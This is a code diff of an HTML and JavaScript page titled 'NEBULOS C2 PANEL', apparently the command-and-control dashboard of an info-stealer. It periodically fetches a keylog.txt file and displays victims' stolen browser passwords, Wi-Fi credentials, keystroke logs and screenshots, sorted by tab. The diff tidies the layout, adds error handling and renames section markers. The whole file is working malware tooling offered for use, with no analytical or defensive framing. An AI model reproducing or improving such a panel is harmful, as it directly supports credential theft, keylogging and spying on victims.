@@ -1,50 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>NEBULOS | C2 CONTROL</title>
+    <title>NEBULOS | C2 PANEL</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        .box { border: 2px solid #0f0; padding: 20px; box-shadow: 0 0 15px #030; }
-        .nav { margin-bottom: 20px; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
+        .box { border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 15px #030; }
+        .nav { margin-bottom: 20px; border-bottom: 1px solid #0f0; padding-bottom: 10px; display: flex; gap: 5px; }
         button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; cursor: pointer; }
         button:hover, .act { background: #0f0; color: #000; font-weight: bold; }
-        #log { white-space: pre-wrap; height: 500px; overflow: auto; border: 1px inset #030; padding: 10px; }
-        #img-view { display: none; width: 100%; border: 1px solid #0f0; margin-top: 10px; }
+        #log { white-space: pre-wrap; height: 500px; overflow: auto; border: 1px inset #030; padding: 10px; background: #050505; }
+        #ss-view { display: none; width: 100%; border: 1px solid #0f0; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2>[ NEBULOS SYSTEM ]</h2>
+        <h2>[ NEBULOS C2 DASHBOARD ]</h2>
         <div class="nav">
+            <button class="act" onclick="v('n')">PASSWORDS</button>
             <button onclick="v('w')">WIFI</button>
-            <button onclick="v('n')">PASSWORDS</button>
             <button onclick="v('k')">KEYLOG</button>
-            <button onclick="v('s')">VISTA REMOTA</button>
+            <button onclick="v('s')">SCREENSHOT</button>
         </div>
         <pre id="log">Estableciendo enlace...</pre>
-        <img id="img-view">
+        <img id="ss-view">
     </div>
 
     <script>
         let raw = "";
         async function up() {
-            const r = await fetch('keylog.txt?t=' + Math.random());
-            if(r.ok) { raw = await r.text(); v('n'); }
+            try {
+                const r = await fetch('keylog.txt?t=' + Math.random());
+                if(r.ok) { raw = await r.text(); v('n'); }
+            } catch(e) {}
         }
         function v(m) {
             const l = document.getElementById('log');
-            const i = document.getElementById('img-view');
+            const i = document.getElementById('ss-view');
             i.style.display = "none"; l.style.display = "block";
             
-            if(m==='w') l.textContent = raw.split('--- WIFI ---')[1]?.split('--- NAVEGADOR ---')[0];
-            else if(m==='n') l.textContent = raw.split('--- NAVEGADOR ---')[1]?.split('--- KEYLOGGER ---')[0];
-            else if(m==='k') l.textContent = raw.split('--- KEYLOGGER ---')[1]?.split('--- SCREENSHOT ---')[0];
+            if(m==='n') l.textContent = raw.split('--- NAV ---')[1]?.split('--- KEYS ---')[0];
+            else if(m==='w') l.textContent = raw.split('--- WIFI ---')[1]?.split('--- NAV ---')[0];
+            else if(m==='k') l.textContent = raw.split('--- KEYS ---')[1]?.split('--- SS ---')[0];
             else if(m==='s') {
-                const b = raw.split('--- SCREENSHOT ---')[1]?.trim();
+                const b = raw.split('--- SS ---')[1]?.trim();
                 if(b) { i.src = "data:image/png;base64," + b; i.style.display = "block"; l.style.display = "none"; }
             }
         }
-        setInterval(up, 20000); up();
+        setInterval(up, 30000); up();
     </script>
 </body>
 </html>
